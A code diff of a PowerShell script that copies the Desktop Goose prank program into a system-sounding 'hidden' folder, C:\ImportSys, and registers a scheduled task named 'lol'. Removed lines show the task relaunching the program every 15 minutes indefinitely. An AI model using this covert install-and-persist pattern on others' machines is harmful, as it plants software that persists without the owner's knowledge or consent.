@@ -18,7 +18,7 @@
 # Directory Traversal + Creation + Modification + File Transfer into hidden "ImportSys" Folder
 #------------------------------#
     # Move to root folder + Create "ImportSys"
-    cd "C:\"
+    Set-Location "C:\"
     
     # Specify the path where you want to create the folder
     $folderPath = "C:\ImportSys"
@@ -31,25 +31,16 @@
     $sourcePath = "D:\Desktop Goose v0.31"
     $destinationPath = "C:\ImportSys"
 
-    # Move the folder
+    # Copy Goose Files to the folder
     Copy-Item -Path $sourcePath -Destination $destinationPath -Recurse
 
 #------------------------------#
 # Task Creation
 #------------------------------#
-# Define variables
-$taskName = "lol"
-$actionExe = "C:\homework\Desktop Goose v0.31\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"
-$trigger = New-ScheduledTaskTrigger -Once -At "9:00 AM" -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration ([TimeSpan]::MaxValue)
-$userName = "DSU"
+  # Define Name
+  $taskName = "lol"
 
-# Define task settings
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-
-# Set action with timeout argument
-$action = New-ScheduledTaskAction -Execute "$actionExe" -Argument "-Timeout 7200"  # 7200 seconds = 2 hours
-
-# Create XML for task definition
+# XML for task definition
 $taskXml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -104,7 +95,7 @@ $taskXml = @"
 </Task>
 "@
 
-# Register scheduled task with settings
+# Register scheduled task with Xml and name
 Register-ScheduledTask -Xml $taskXml -TaskName $taskName
 #-------------------------------------------------------------#
 # End Script
